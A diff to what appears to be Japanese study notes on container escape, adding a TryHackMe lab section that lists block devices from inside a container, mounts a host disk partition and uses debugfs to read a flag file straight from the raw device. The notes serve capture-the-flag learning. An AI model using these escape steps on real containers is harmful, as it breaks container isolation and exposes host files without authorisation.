@@ -431,6 +431,30 @@ cat /proc/self/mountinfo
 ...
 ```
 
+### [ディスクマウント](https://tryhackme.com/room/advancedcontainerattacks?taskNo=4&sharerId=674ed42e2374d1bc93db444c)
+
+```sh
+root@bravo:/# lsblk
+NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+...
+loop50        7:50   0     1G  0 loop 
+`-loop50p1  259:3    0  1022M  0 part 
+...
+`-nvme0n1p1 259:2    0    75G  0 part /etc/hosts
+                                      /etc/hostname
+                                      /etc/resolv.conf
+                                      /shared
+
+mkdir /mnt/hostdisk && mount /dev/loop50p1 /mnt/hostdisk
+mount | grep hostdisk
+```
+
+マウントには CAP_SYS_ADMIN が必要だが、READ権限があれば debugfs で読める場合がある。composer構成で --device:r が分かれば・・・
+
+```sh
+debugfs -R 'cat /var/backups/flag3.txt' /dev/loop50p1
+```
+
 ### [カーネルモジュール挿入によるエスケープ](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_module)
 
 1. ゲストOSの root であること
